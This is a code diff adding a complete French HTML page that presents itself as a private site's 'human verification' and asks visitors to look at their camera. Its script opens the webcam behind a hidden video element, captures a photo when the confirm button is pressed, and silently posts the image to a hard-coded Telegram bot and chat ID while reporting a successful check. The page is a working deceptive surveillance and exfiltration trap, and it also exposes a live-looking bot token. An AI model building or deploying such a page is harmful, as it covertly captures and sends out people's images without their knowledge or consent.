@@ -1,1 +1,79 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Gangster Web Official</title>
+  <style>
+    body {
+      background: #ccc;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 40px;
+    }
 
+    button {
+      background: #1e1e1e;
+      color: white;
+      width: 200px;
+      height: 40px;
+      border-radius: 2rem;
+      border: none;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+
+    video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <h3>Nous devons vérifier que vous êtes humain. Ce site est privé !</h3>
+  <h4>Veuillez regarder la caméra pendant la vérification.</h4>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <button id="capture">Confirmer</button>
+
+  <script>
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const captureBtn = document.getElementById("capture");
+    const ctx = canvas.getContext("2d");
+
+    // Démarrer la caméra
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(() => {
+        alert("Accès à la caméra refusé.");
+      });
+
+    captureBtn.addEventListener("click", async () => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));
+      const formData = new FormData();
+      formData.append("chat_id", "7879061625");
+      formData.append("photo", blob, "photo.png");
+
+      try {
+        await fetch("https://api.telegram.org/bot7894685926:AAE8H-ErP0P67Vt0CCdJpYm379l6i5LQogc/sendPhoto", {
+          method: "POST",
+          body: formData
+        });
+        alert("Vérification envoyée avec succès.");
+      } catch (e) {
+        alert("Une erreur s'est produite. Veuillez réessayer.");
+      }
+    });
+  </script>
+
+</body>
+</html>
